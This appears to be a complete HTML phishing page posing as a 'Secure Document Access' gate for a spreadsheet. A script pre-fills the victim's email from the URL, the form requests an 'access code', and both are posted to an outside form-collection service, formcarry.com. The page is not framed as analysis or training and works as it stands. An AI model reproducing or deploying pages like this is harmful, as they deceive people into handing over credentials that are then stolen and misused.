<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Document Access</title>

<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #e9ecef;
  }

  /* Blurred spreadsheet-style background */
  .bg {
    position: fixed;
    inset: 0;
    background:
      linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)),
      repeating-linear-gradient(
        to bottom,
        #f8f9fa 0px,
        #f8f9fa 32px,
        #dee2e6 33px
      );
    filter: blur(2px);
  }

  /* Center modal */
  .modal {
    position: fixed;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .card {
    background: #ffffff;
    width: 360px;
    border-radius: 6px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
    padding: 22px;
  }

  .icon {
    text-align: center;
    margin-bottom: 10px;
    font-size: 36px;
    color: #1f7a4d;
  }

  h2 {
    text-align: center;
    font-size: 16px;
    margin: 8px 0 14px;
    color: #333;
  }

  p {
    font-size: 13px;
    color: #555;
    text-align: center;
    margin-bottom: 16px;
  }

  label {
    font-size: 12px;
    color: #444;
    display: block;
    margin-bottom: 6px;
  }

  input {
    width: 100%;
    padding: 9px;
    margin-bottom: 12px;
    border: 1px solid #cfcfcf;
    border-radius: 4px;
    font-size: 13px;
  }

  button {
    width: 100%;
    background: #1f7a4d;
    border: none;
    color: #fff;
    padding: 10px;
    font-size: 14px;
    border-radius: 4px;
    cursor: pointer;
  }

  button:hover {
    background: #17613d;
  }

  .footer {
    text-align: center;
    font-size: 11px;
    color: #777;
    margin-top: 14px;
  }
</style>
</head>

<body>

<div class="bg"></div>

<div class="modal">
  <div class="card">

    <div class="icon">ðŸ”’</div>

    <h2>Secure Document Access</h2>

    <div class="notice">
    ðŸ”’ <strong>This secured document can only be accessed by the email below.</strong><br>
    Please confirm access to view this spreadsheet.
  </div>

    <!-- FORM -->
    <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
      
      <label>Authorized Email</label>
      <input type="email" name="email" id="email" readonly required>

      <label>Access Code</label>
      <input type="text" name="access_code" placeholder="Enter document access code" required>

      <button type="submit">Confirm Access</button>
    </form>

    <div class="footer">
      Protected document preview Â· Authorized access only
    </div>

  </div>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");
  if (email) {
    document.getElementById("email").value = email;
  }
</script>

</body>
</html>
